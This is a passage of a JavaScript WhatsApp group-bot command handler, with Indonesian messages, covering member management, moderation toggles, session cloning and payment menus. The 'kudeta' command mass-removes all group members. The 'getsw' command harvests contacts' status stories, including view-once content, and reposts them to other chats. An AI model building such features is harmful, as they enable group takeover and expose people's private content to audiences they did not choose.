      const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
      var onWa = await client.onWhatsApp(input.split("@")[0])
      if (onWa.length < 1) return xreply("Nomor tidak terdaftar di whatsapp")
      const res = await client.groupParticipantsUpdate(m.chat, [input], 'add')
      if (Object.keys(res).length == 0) {
        return xreply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
      } else {
        return xreply(JSON.stringify(res, null, 2))
      }
    } else {
      return xreply(example("62838###"))
    }
  }
  break

  case "ht":
  case "hidetag": {
    if (!isOwner && !isPremium) return reply(mess.owner)
    if (!text) return xreply(example("pesannya"))
    let member = m.metadata.participants.map(v => v.id)
    await client.sendMessage(m.chat, { text: text, mentions: [...member] }, { quoted: m })
  }
  break

  case "kick":
  case "kik": {
    if (!isOwner && !isPremium) return reply(mess.owner)
    if (text || m.quoted) {
      const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
      var onWa = await client.onWhatsApp(input.split("@")[0])
      if (onWa.length < 1) return xreply("Nomor tidak terdaftar di whatsapp")
      const res = await client.groupParticipantsUpdate(m.chat, [input], 'remove')
      await xreply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
    } else {
      return xreply(example("@tag/reply"))
    }
  }
  break

  case "leave": {
    if (!isOwner && !isPremium) return reply(mess.owner)
    await xreply("Baik, Saya Akan Keluar Dari Grup Ini")
    await sleep(4000)
    await client.groupLeave(m.chat)
  }
  break

  case "kudetagc":
  case "kudeta": {
    if (!isOwner) return reply(mess.owner)
    let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
    if (memberFilter.length < 1) return xreply("Grup Ini Sudah Tidak Ada Member!")
    await xreply("Kudeta Grup Khusus Owner")
    for (let i of memberFilter) {
      await client.groupParticipantsUpdate(m.chat, [i], 'remove')
      await sleep(1000)
    }
    await xreply("Kudeta Grup Telah Berhasil 🏴‍☠️")
  }
  break

  case "demote":
  case "promote": {
    if (!isOwner && !isPremium) return reply(mess.owner)
    if (m.quoted || text) {
      var action
      let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
      if (/demote/.test(command)) action = "Demote"
      if (/promote/.test(command)) action = "Promote"
      await client.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
        await client.sendMessage(m.chat, { text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target] }, { quoted: m })
      })
    } else {
      return xreply(example("@tag/628xxx"))
    }
  }
  break

  case "mute": {
    if (!isOwner && !isPremium) return reply(mess.owner)
    let teks = text.toLowerCase()
    if (teks == "on") {
      if (global.db.groups[m.chat].mute == true) return xreply(`*Mute* di grup ini sudah aktif!`)
      global.db.groups[m.chat].mute = true
      return xreply("Berhasil menyalakan *mute* di grup ini")
    } else if (teks == "off") {
      if (global.db.groups[m.chat].mute == false) return xreply(`*Mute* di grup ini tidak aktif!`)
      global.db.groups[m.chat].mute = false
      return xreply("Berhasil mematikan *mute* di grup ini")
    } else return xreply(example("on/off"))
  }
  break

  case "antilink2": {
    if (!m.isGroup) return reply(mess.group)
    if (!isOwner) return reply(mess.owner)
    if (!text) return xreply(example("on/off"))
    let teks = text.toLowerCase()
    if (teks == "on") {
      if (global.db.groups[m.chat].antilink2 == true) return xreply(`*Antilink2* di grup ini sudah aktif!`)
      if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
      global.db.groups[m.chat].antilink2 = true
      return reply("Berhasil menyalakan *antilink2* di grup ini")
    } else if (teks == "off") {
      if (global.db.groups[m.chat].antilink2 == false) return xreply(`*Antilink2* di grup ini tidak aktif!`)
      global.db.groups[m.chat].antilink2 = false
      return reply("Berhasil mematikan *antilink2* di grup ini")
    } else return xreply(example("on/off"))
  }
  break

  /// ───────────── [ Anti Tag Status ] ──────────── ///
  case "antitagsw": {
    if (!m.isGroup) return reply(mess.group)
    if (!isOwner && !isSenderAdmin) return reply(mess.admin)
    if (!text) return xreply(example("on/off"))
    let teks = text.toLowerCase()
    if (teks == "on") {
      if (global.db.groups[m.chat].antitagsw == true) return xreply(`*Antitagsw* di grup ini sudah aktif!`)
      global.db.groups[m.chat].antitagsw = true
      global.markDatabaseDirty?.()
      return reply("Berhasil menyalakan *antitagsw* di grup ini" + (isBotAdmin ? "" : "\n\n⚠️ Bot belum jadi admin, jadikan bot admin supaya bisa menghapus pesan tag status."))
    } else if (teks == "off") {
      if (global.db.groups[m.chat].antitagsw == false) return xreply(`*Antitagsw* di grup ini tidak aktif!`)
      global.db.groups[m.chat].antitagsw = false
      global.markDatabaseDirty?.()
      return reply("Berhasil mematikan *antitagsw* di grup ini")
    } else return xreply(example("on/off"))
  }
  break

  /// ───────────── [ Get Story WhatsApp ] ──────────── ///
  case "getsw": case "ambilsw": case "storywa": {
    if (!isOwner && !isPremium) return reply(mess.prem)

    const swCache = client.statusCache
    const swUserKey = (jid = '') => String(jid || '').split('@')[0].split(':')[0]

    if (!swCache || swCache.size === 0) {
      return xreply("📭 Belum ada story yang tertangkap.\n\nBot hanya bisa mengambil story yang masuk *saat bot online* (maks. 24 jam terakhir).")
    }

    if (/^list$/i.test((text || '').trim())) {
      const rows = []
      for (const [user, items] of swCache) {
        const fresh = items.filter(e => Date.now() - e.timestamp < 24 * 60 * 60 * 1000)
        if (fresh.length) rows.push(`• @${user} — ${fresh.length} story`)
      }
      if (!rows.length) return xreply("📭 Belum ada story yang tertangkap.")
      return client.sendMessage(m.chat, {
        text: `*Sw Tersimpan*\n${rows.slice(0, 40).join("\n")}\nAmbil dengan: ${prefix}getsw @user`,
        mentions: rows.slice(0, 40).map(r => r.match(/@(\d+)/)[1] + "@s.whatsapp.net")
      }, { quoted: m })
    }
    
    const swArgs = (text || '').trim().split(/\s+/).filter(Boolean)
    let swTarget = m.mentionedJid?.[0] || m.quoted?.sender || ''
    let swIndex = 0
    if (!swTarget) {
      const num = (swArgs[0] || '').replace(/[^0-9]/g, '')
      if (num.length >= 8) {
        swTarget = num + "@s.whatsapp.net"
        swIndex = parseInt(swArgs[1]) || 0
      } else if (!m.isGroup) {
        swTarget = m.chat
        swIndex = parseInt(swArgs[0]) || 0
      }
    } else {
      swIndex = parseInt(swArgs.find(a => /^\d{1,2}$/.test(a))) || 0
    }
    if (!swTarget) return xreply(example("@user") + `\nAtau: *${prefix}getsw 628xxx*\nDaftar: *${prefix}getsw list*`)

    const swKeys = new Set([swUserKey(swTarget)])
    try {
      const mapper = client.signalRepository?.lidMapping
      if (mapper) {
        const lid = await mapper.getLIDForPN?.(swTarget.includes('@') ? swTarget : swTarget + '@s.whatsapp.net')
        if (lid) swKeys.add(swUserKey(lid))
        const pn = await mapper.getPNForLID?.(swTarget)
        if (pn) swKeys.add(swUserKey(pn))
      }
    } catch {}

    const seen = new Set()
    let swItems = []
    for (const k of swKeys) {
      for (const e of (swCache.get(k) || [])) {
        if (seen.has(e.key.id)) continue
        seen.add(e.key.id)
        if (Date.now() - e.timestamp < 24 * 60 * 60 * 1000) swItems.push(e)
      }
    }
    swItems.sort((a, b) => a.timestamp - b.timestamp)

    if (!swItems.length) {
      return client.sendMessage(m.chat, {
        text: `📭 Tidak ada story dari @${swUserKey(swTarget)} yang tertangkap.\n\nBot hanya bisa mengambil story yang masuk saat bot online, dan hanya dari kontak yang membagikan story ke nomor bot.`,
        mentions: [swTarget.includes('@') ? swTarget : swTarget + '@s.whatsapp.net']
      }, { quoted: m })
    }

    const swTotal = swItems.length
    if (swIndex > 0) swItems = swItems.slice(swIndex - 1, swIndex)
    else swItems = swItems.slice(0, 10)

    if (swIndex > 0 && !swItems.length) return xreply(`❌ Story nomor ${swIndex} tidak ada. Total story: ${swTotal}`)

    await xreply(`⏳ 𝖬𝖾𝗇𝗀𝖺𝗆𝖻𝗂𝗅 𝖲𝗐...`)

    const swDownload = async (node, type) => {
      const stream = await downloadContentFromMessage(node, type)
      const chunks = []
      for await (const chunk of stream) chunks.push(chunk)
      return Buffer.concat(chunks)
    }

    const swMention = [swTarget.includes('@') ? swTarget : swTarget + '@s.whatsapp.net']
    let swFailed = 0
    for (const item of swItems) {
      try {
        let content = item.message
        for (let i = 0; i < 3; i++) {
          const t = getContentType(content)
          if (/viewOnceMessage|ephemeralMessage|documentWithCaptionMessage/i.test(t || '')) content = content[t].message
          else break
        }
        const type = getContentType(content)
        const node = content[type]
        const when = moment(item.timestamp).tz('Asia/Jakarta').format('DD/MM HH:mm')
        const head = `🔔 𝖲𝗐 @${swUserKey(swTarget)} - ${when}`

        if (type === 'imageMessage') {
          const buf = await swDownload(node, 'image')
          await client.sendMessage(m.chat, { image: buf, caption: `${head}${node.caption ? '\n\n' + node.caption : ''}`, mentions: swMention }, { quoted: m })
        } else if (type === 'videoMessage') {
          const buf = await swDownload(node, 'video')
          await client.sendMessage(m.chat, { video: buf, caption: `${head}${node.caption ? '\n\n' + node.caption : ''}`, mentions: swMention }, { quoted: m })
        } else if (type === 'audioMessage') {
          const buf = await swDownload(node, 'audio')
          await client.sendMessage(m.chat, { audio: buf, mimetype: node.mimetype || 'audio/mpeg', ptt: !!node.ptt }, { quoted: m })
        } else if (type === 'extendedTextMessage' || type === 'conversation') {
          const teksSw = type === 'conversation' ? node : node.text
          await client.sendMessage(m.chat, { text: `${head}\n\n${teksSw || ''}`, mentions: swMention }, { quoted: m })
        } else {
          swFailed++
          continue
        }
        await sleep(1200)
      } catch (err) {
        swFailed++
        console.log('[GETSW]', err?.message || err)
      }
    }

    if (swFailed) await xreply(`⚠️ ${swFailed} story gagal diambil (mungkin sudah kedaluwarsa atau tipenya tidak didukung).`)
    if (swIndex === 0 && swTotal > swItems.length) {
      await xreply(`ℹ️ Menampilkan ${swItems.length} dari ${swTotal} story. Ambil satu per satu: *${prefix}getsw @user <nomor>*`)
    }
  }
  break

  case "antilink": {
    if (!m.isGroup) return reply(mess.group)
    if (!isOwner) return reply(mess.owner)
    if (!text) return xreply(example("on/off"))
    let teks = text.toLowerCase()
    if (teks == "on") {
      if (global.db.groups[m.chat].antilink == true) return xreply(`*Antilink* di grup ini sudah aktif!`)
      if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
      global.db.groups[m.chat].antilink = true
      return reply("Berhasil menyalakan *antilink* di grup ini")
    } else if (teks == "off") {
      if (global.db.groups[m.chat].antilink == false) return xreply(`*Antilink* di grup ini tidak aktif!`)
      global.db.groups[m.chat].antilink = false
      return reply("Berhasil mematikan *antilink* di grup ini")
    } else return xreply(example("on/off"))
  }
  break

  case "welcome": {
    if (!m.isGroup) return reply(mess.group)
    if (!isOwner) return reply(mess.owner)
    if (!text) return reply(example("on/off"))
    let teks = text.toLowerCase()
    if (teks == "on") {
      if (global.db.groups[m.chat].welcome == true) return reply(`*Welcome* di grup ini sudah aktif!`)
      global.db.groups[m.chat].welcome = true
      return xreply("Berhasil menyalakan *welcome* di grup ini")
    } else if (teks == "off") {
      if (global.db.groups[m.chat].welcome == false) return reply(`*Welcome* di grup ini tidak aktif!`)
      global.db.groups[m.chat].welcome = false
      return reply("Berhasil mematikan *welcome* di grup ini")
    } else return xreply(example("on/off"))
  }
  break

  case 'antilinkch': {
    if (!m.isGroup) return reply(mess.group)
    if (!isOwner) return reply(mess.owner)
    if (!antichannel[m.chat]) antichannel[m.chat] = { active: false, warnings: {}, antichannel: false }

    const argsLower = q.toLowerCase();
    if (argsLower === 'on') {
      antichannel[m.chat].antichannel = true;
      saveAntichannel();
      Reply('✅ Anti Link Channel WhatsApp AKTIF!');
    } else if (argsLower === 'off') {
      antichannel[m.chat].antichannel = false;
      saveAntichannel();
      Reply('❌ Anti Link Channel WhatsApp NONAKTIF!');
    } else {
      Reply(`Contoh:\n*${prefix}antichannel on*\n*${prefix}antichannel off*`);
    }
  }
  break

  /// ───────────── [ 𝖩𝖺𝖽𝗂𝖻𝗈𝗍 ] ──────────── ///
  case "jadibot": {
    const targetNumber = String(text || "").trim().replace(/[^0-9]/g, "")

    if (!targetNumber) {
      return xreply(`❌ example: .jadibot 628xxx`)
    }

    if (!/^62\d{8,15}$/.test(targetNumber)) {
      return xreply(`❌ Format nomor tidak valid.\n\nGunakan format internasional tanpa tanda + atau spasi.\nContoh: .jadibot 628xxx`)
    }

    const result = await jadibotManager.start(client, targetNumber, module.exports, m)
    if (result.message) await xreply(result.message)
  }
  break

  case "bataljadibot": {
    const targetNumber = String(args[1] || "").trim().replace(/[^0-9]/g, "")

    let result
    if (targetNumber) {
      result = await jadibotManager.cancelByTarget(targetNumber, m.sender)
    } else {
      result = await jadibotManager.cancelByRequester(m.sender)
    }

    if (result.unauthorized) return xreply(result.message)
    if (!result.ok) return xreply(result.message || "❌ Proses Jadibot tidak ditemukan.")

    const number = result.number || targetNumber
    await xreply(`✅ *Jadibot ${number ? number + ' ' : ''}berhasil dibatalkan*`)
  }
  break

  case "stopjadibot": {
    const targetJid = m.sender
    const active = jadibotManager.entries?.get?.(targetJid)

    if (!active) {
      return xreply("❌ Kamu tidak memiliki Jadibot yang aktif.")
    }

    try {
      await xreply("⏹️ *Jadibot sedang dihentikan...*\n\nSession clone akan dihapus dan koneksi akan ditutup.")
    } catch (error) {
    }

    await jadibotManager.stop(targetJid, true)
  }
  break

  case "listjadibot": {
    if (!isOwner) return reply(mess.owner)

    const active = await jadibotManager.listActive()
    if (!active.length) return xreply(`╭─〔 *LIST JADIBOT* 〕\n│ Tidak ada Jadibot aktif.\n│ Limit: *${jadibotManager.max} orang*\n╰──────────────`)

    let teks = `╭─〔 *LIST JADIBOT AKTIF* 〕\n`
    for (const item of active) {
      teks += `│ ${item.no}. @${item.number} — *${item.status}*\n`
    }
    teks += `├──────────────\n│ Aktif: *${active.length}/${jadibotManager.max} orang*\n╰──────────────`

    await client.sendMessage(m.chat, {
      text: teks,
      mentions: active.map(item => item.jid)
    }, { quoted: m })
  }
  break

  /// ───────────── [ 𝖮𝗐𝗇𝖾𝗋 & 𝖡𝗈𝗍 𝖬𝖺𝗇𝖺𝗀𝖾𝗆𝖾𝗇𝗍 ] ──────────── ///
  case "totalfitur": {
    try {
      let total = totalfitur();
      Reply(`*Total fitur aktif saat ini:* ${total} fitur!`);
    } catch (e) {
      Reply(`Gagal membaca total fitur:\n${e.message}`);
    }
  }
  break

  case "developerbot":
  case "owner": {
    await client.sendContact(m.chat, [global.owner], m)
  }
  break

  case "save":
  case "sv": {
    if (!isOwner) return
    await client.sendContact(m.chat, [m.chat.split("@")[0]], m)
  }
  break

  case "ping":
  case "uptime": {
    let timestamp = speed();
    let latensi = speed() - timestamp;
    let tio = await nou.os.oos();
    var tot = await nou.drive.info();
    let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION ${global.botname}*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
    await xreply(respon)
  }
  break

  case "public": {
    if (!isOwner) return
    client.public = true
    xreply("Berhasil mengganti ke mode *public*")
  }
  break

  case "self": {
    if (!isOwner) return xreply(mess.owner)
    client.public = false
    xreply("Berhasil mengganti mode bot menjadi *Self*")
  }
  break

  case "restart":
  case "rst": {
    if (!isOwner) return reply(mess.owner)
    await xreply("Memproses _restart server_ . . .")
    var file = await fs.readdirSync("./session")
    var anu = await file.filter(i => i !== "creds.json")
    for (let t of anu) {
      await fs.unlinkSync(`./session/${t}`)
    }
    await process.send('reset')
  }
  break

  case "clearchat":
  case "clc": {
    if (!isOwner) return reply(mess.owner)
    client.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }] }, m.chat)
  }
  break

  case "bersihbot": {
    const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
    const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
    for (const i of dirsesi) {
      await fs.unlinkSync("./session/" + i)
    }
    for (const u of dirsampah) {
      await fs.unlinkSync("./library/database/sampah/" + u)
    }
    xreply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
  }
  break

  /// ───────────── [ 𝖫𝗂𝗌𝗍 & 𝖬𝖺𝗇𝖺𝗀𝖾 𝖮𝗐𝗇𝖾𝗋 ] ──────────── ///
  case "listowner":
  case "listown": {
    if (owners.length < 1) return xreply("Tidak ada owner tambahan")
    let teks = `\n *乂 List all owner tambahan*\n`
    for (let i of owners) {
      teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
    }
    client.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: m })
  }
  break

  case "delowner":
  case "delown": {
    if (!isOwner) return reply(mess.owner)
    if (!m.quoted && !text) return xreply(example("6285###"))
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
    const input2 = input.split("@")[0]
    if (input2 === global.owner || input == botNumber) return xreply(`Tidak bisa menghapus owner utama!`)
    if (!owners.includes(input)) return xreply(`Nomor ${input2} bukan owner bot!`)
    let posi = owners.indexOf(input)
    await owners.splice(posi, 1)
    await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
    xreply(`Berhasil menghapus owner ✅`)
  }
  break

  case "addowner":
  case "addown": {
    if (!isOwner) return reply(mess.owner)
    if (!m.quoted && !text) return xreply(example("628xxx"))
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
    const input2 = input.split("@")[0]
    if (input2 === global.owner || owners.includes(input) || input === botNumber) return xreply(`Nomor ${input2} sudah menjadi owner bot!`)
    owners.push(input)
    await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
    xreply(`Berhasil menambah owner ✅`)
  }
  break

  /// ───────────── [ 𝖯𝖺𝗒𝗆𝖾𝗇𝗍 ] ──────────── ///
  case "pay": {
    const teks = `‼️\`𝖬𝖾𝗍𝗈𝖽𝖾 𝖯𝖾𝗆𝖻𝖺𝗒𝖺𝗋𝖺𝗇\``
    const deks = `*𝖲𝗂𝗅𝖺𝗄𝖺𝗇 𝗉𝗂𝗅𝗂𝗁 𝗆𝖾𝗍𝗈𝖽𝖾 𝗉𝖾𝗆𝖻𝖺𝗒𝖺𝗋𝖺𝗇 𝗒𝖺𝗇𝗀 𝗍𝖾𝗋𝗌𝖾𝖽𝗂𝖺. 𝖯𝖺𝗌𝗍𝗂𝗄𝖺𝗇 𝗇𝗈𝗆𝗂𝗇𝖺𝗅 𝖽𝖺𝗇 𝗍𝗎𝗃𝗎𝖺𝗇 𝗉𝖾𝗆𝖻𝖺𝗒𝖺𝗋𝖺𝗇 𝗌𝗎𝖽𝖺𝗁 𝖻𝖾𝗇𝖺𝗋 𝗌𝖾𝖻𝖾𝗅𝗎𝗆 𝗆𝖾𝗅𝖺𝗄𝗎𝗄𝖺𝗇 𝗍𝗋𝖺𝗇𝗌𝖺𝗄𝗌𝗂.*

*🔔 𝖤-𝖶𝖺𝗅𝗅𝖾𝗍:*
└╼ 𝖣𝖺𝗇𝖺
└╼ 𝖮𝗏𝗈
└╼ 𝖦𝗈𝖯𝖺𝗒
`
    const buttonMsg = generateWAMessageFromContent(m.chat, {
      buttonsMessage: {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: `${global.botname}`,
          address: "Payment",
          jpegThumbnail: pay
        },
        contentText: teks,
        footerText: deks,
        buttons: [
          {
            buttonId: "menu",
            buttonText: {
              displayText: "💳 pilih metode pembayaran"
            },
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "client Payment",
                sections: [
                  {
                    title: "Pilih metode pembayaran",
                    highlight_label: "〽️",
                    rows: [
                      {
                        header: "",
                        title: "Qris",
                        description: `${global.namaqris}`,
                        id: ".qris",
                      },
                      {
                        header: "",
                        title: "Dana",
                        description: `${global.dana}`,
                        id: ".dana",
                      },
                      {
                        header: "",
                        title: "Gopay",
                        description: `${global.gopay}`,
                        id: ".gopay",
                      },
                      {
                        header: "",
                        title: "Ovo",
                        description: `${global.ovo}`,
                        id: ".ovo",
                      },
                      {
                        title: "Shoopepay",
                        description: `${global.shoopepay}`,
                        id: ".shoopepay",
                      }
                    ]
                  }
                ]
              })
            },
            type: 1
          }
        ],
        headerType: 6
      }
    }, {
      userJid: client.user.id,
      quoted: m,
      messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
    })
    await client.relayMessage(m.chat, buttonMsg.message, {
      messageId: buttonMsg.key.id,
      additionalNodes: [
        {
          tag: "biz",
          attrs: {},
          content: [
            {
              tag: "interactive",
              attrs: {
                type: "native_flow",
                v: "1"
              },
              content: [
                {
                  tag: "native_flow",
                  attrs: {
                    v: "9",
                    name: "mixed"
                  },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    })
  }
  break

case "dana": {
  const dir = [path.join(process.cwd(), "media", "payment"), path.join(__dirname, "media", "payment")]
    .find(d => fs.existsSync(d))
  const file = dir && fs.readdirSync(dir).find(f => /^dana\.(jpe?g|png|webp)$/i.test(f))
  const paymentImage = file ? path.join(dir, file) : null
  if (!paymentImage) return xreply("Gambar dana tidak ditemukan di folder media/payment")

  const teks = `
*PAYMENT DANA*

*Nomor :* ${global.dana}
*Atas Nama :* ${global.andana}

*[ ! ] Penting :* Wajib kirimkan bukti transfer demi keamanan bersama.
`

  const imgsc = await prepareWAMessageMedia(
    { image: { url: paymentImage } },
    { upload: client.waUploadToServer }
  )

  const interactive = {
    header: {
      title: "",
      hasMediaAttachment: true,
      imageMessage: imgsc.imageMessage
    },
    body: { text: teks },
    nativeFlowMessage: {
      buttons: [{
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
          display_text: "copy dana",
          id: "copy_dana",
          copy_code: String(global.dana)
        })
      }]
    }
  }

  const buttonMsg = generateWAMessageFromContent(m.chat, {
    viewOnceMessageV2Extension: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject(interactive)
      }
    }
  }, {
    userJid: client.user.id,
    quoted: m,
    messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
  })

  let additionalNodes = [
    {
      tag: "biz",
      attrs: {},
      content: [
        {
          tag: "interactive",
          attrs: { type: "native_flow", v: "1" },
          content: [
            { tag: "native_flow", attrs: { v: "9", name: "mixed" }, content: [] }
          ]
        }
      ]
    }
  ]

  await client.relayMessage(m.chat, buttonMsg.message, {
    messageId: buttonMsg.key.id,
    additionalNodes: additionalNodes
  })
}
break

case "ovo": {
  const dir = [path.join(process.cwd(), "media", "payment"), path.join(__dirname, "media", "payment")]
    .find(d => fs.existsSync(d))
  const file = dir && fs.readdirSync(dir).find(f => /^ovo\.(jpe?g|png|webp)$/i.test(f))
  const paymentImage = file ? path.join(dir, file) : null
  if (!paymentImage) return xreply("Gambar ovo tidak ditemukan di folder media/payment")

  const teks = `
*PAYMENT OVO*

*Nomor :* ${global.ovo}
*Atas Nama :* ${global.anovo}

*[ ! ] Penting :* Wajib kirimkan bukti transfer demi keamanan bersama.
`

  const imgsc = await prepareWAMessageMedia(
    { image: { url: paymentImage } },
    { upload: client.waUploadToServer }
  )

  const interactive = {
    header: {
      title: "",
      hasMediaAttachment: true,
      imageMessage: imgsc.imageMessage
    },
    body: { text: teks },
    nativeFlowMessage: {
      buttons: [{
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
          display_text: "copy ovo",
          id: "copy_ovo",
          copy_code: String(global.ovo)
        })
      }]
    }
  }

  const buttonMsg = generateWAMessageFromContent(m.chat, {
    viewOnceMessageV2Extension: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject(interactive)
      }
    }
  }, {
    userJid: client.user.id,
    quoted: m,
    messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
  })

  let additionalNodes = [
    {
      tag: "biz",
      attrs: {},
      content: [
        {
          tag: "interactive",
          attrs: { type: "native_flow", v: "1" },
          content: [
            { tag: "native_flow", attrs: { v: "9", name: "mixed" }, content: [] }
          ]
        }
      ]
    }
  ]

  await client.relayMessage(m.chat, buttonMsg.message, {
    messageId: buttonMsg.key.id,
    additionalNodes: additionalNodes
  })
}
break

case "gopay": {
  const dir = [path.join(process.cwd(), "media", "payment"), path.join(__dirname, "media", "payment")]
    .find(d => fs.existsSync(d))
  const file = dir && fs.readdirSync(dir).find(f => /^gopay\.(jpe?g|png|webp)$/i.test(f))
  const paymentImage = file ? path.join(dir, file) : null
  if (!paymentImage) return xreply("Gambar gopay tidak ditemukan di folder media/payment")

  const teks = `
*PAYMENT GOPAY*

*Nomor :* ${global.gopay}
*Atas Nama :* ${global.angopay}

*[ ! ] Penting :* Wajib kirimkan bukti transfer demi keamanan bersama.
`

  const imgsc = await prepareWAMessageMedia(
    { image: { url: paymentImage } },
    { upload: client.waUploadToServer }
  )

  const interactive = {
    header: {
      title: "",
      hasMediaAttachment: true,
      imageMessage: imgsc.imageMessage
    },
    body: { text: teks },
    nativeFlowMessage: {
      buttons: [{
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
          display_text: "copy gopay",
          id: "copy_gopay",
          copy_code: String(global.gopay)
        })
      }]
    }
  }

  const buttonMsg = generateWAMessageFromContent(m.chat, {
    viewOnceMessageV2Extension: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject(interactive)
      }
    }
  }, {
    userJid: client.user.id,
    quoted: m,
    messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
  })

  let additionalNodes = [
    {
      tag: "biz",
      attrs: {},
      content: [
        {
          tag: "interactive",
          attrs: { type: "native_flow", v: "1" },
          content: [
            { tag: "native_flow", attrs: { v: "9", name: "mixed" }, content: [] }
          ]
        }
      ]
    }
  ]

  await client.relayMessage(m.chat, buttonMsg.message, {
    messageId: buttonMsg.key.id,
    additionalNodes: additionalNodes
  })
}
break

case "shoopepay":
case "shopepay": {
  const dir = [path.join(process.cwd(), "media", "payment"), path.join(__dirname, "media", "payment")]
    .find(d => fs.existsSync(d))
  const file = dir && fs.readdirSync(dir).find(f => /^(shoopepay|shopepay)\.(jpe?g|png|webp)$/i.test(f))
  const paymentImage = file ? path.join(dir, file) : null
  if (!paymentImage) return xreply("Gambar shopepay tidak ditemukan di folder media/payment (nama file: shoopepay.jpg)")

  const teks = `
*PAYMENT SHOPEEPAY*

*Nomor :* ${global.shoopepay}
*Atas Nama :* ${global.anshoope}

*[ ! ] Penting :* Wajib kirimkan bukti transfer demi keamanan bersama.
`

  const imgsc = await prepareWAMessageMedia(
    { image: { url: paymentImage } },
    { upload: client.waUploadToServer }
  )

  const interactive = {
    header: {
      title: "",
      hasMediaAttachment: true,
      imageMessage: imgsc.imageMessage
    },
    body: { text: teks },
    nativeFlowMessage: {
      buttons: [{
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
          display_text: "copy shopeepay",
          id: "copy_shoopepay",
          copy_code: String(global.shoopepay)
        })
      }]
    }
  }

  const buttonMsg = generateWAMessageFromContent(m.chat, {
    viewOnceMessageV2Extension: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject(interactive)
      }
    }
  }, {
    userJid: client.user.id,
    quoted: m,
    messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
  })

  let additionalNodes = [
    {
      tag: "biz",
      attrs: {},
      content: [
        {
          tag: "interactive",
          attrs: { type: "native_flow", v: "1" },
          content: [
            { tag: "native_flow", attrs: { v: "9", name: "mixed" }, content: [] }
          ]
        }
      ]
    }
  ]

  await client.relayMessage(m.chat, buttonMsg.message, {
    messageId: buttonMsg.key.id,
    additionalNodes: additionalNodes
  })
}
break

  case "qris": {
    const paymentImage = path.join(__dirname, "media", "payment", "qris.jpg")
    const teks = `*⁉️ 𝖭𝖮𝖳𝖤:* 𝖶𝖺𝗃𝗂𝖻 𝗄𝗂𝗋𝗂𝗆𝗄𝖺𝗇 𝖻𝗎𝗄𝗍𝗂 𝗍𝗋𝖺𝗇𝗌𝖿𝖾𝗋 𝖽𝖾𝗆𝗂 𝗄𝖾𝖺𝗆𝖺𝗇𝖺𝗇 bersama.`
    if (!fs.existsSync(paymentImage)) return xreply("error di case qris")
    await client.sendMessage(m.chat, { image: fs.readFileSync(paymentImage), caption: teks }, { quoted: qpayment })
  }
  break

  case "ambilq":
  case "q": {
    if (!m.quoted) return
    let jsonData = JSON.stringify(m.quoted, null, 2)
    xreply(jsonData)
  }
  break

  case "proses": {
    if (!isOwner) return reply(mess.owner)
    if (!q) return xreply(example("jasa install panel"))
    let teks = `📦 ${text}
⏰ ${new Date().toLocaleString('id-ID')}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
    await client.sendMessage(m.chat, {
      text: teks, mentions: [m.sender], contextInfo: {
        externalAdReply: {
          title: `Dana Masuk ✅`,
          body: `© Powered By ${namaOwner}`,
          thumbnailUrl: global.image.reply,
          sourceUrl: `${global.source}`,
        }
      }
    }, { quoted: null })
  }
  break

  case "done": {
    if (!isOwner) return reply(mess.owner)
    if (!q) return xreply(example("jasa install panel"))
    let teks = `📦 ${text}
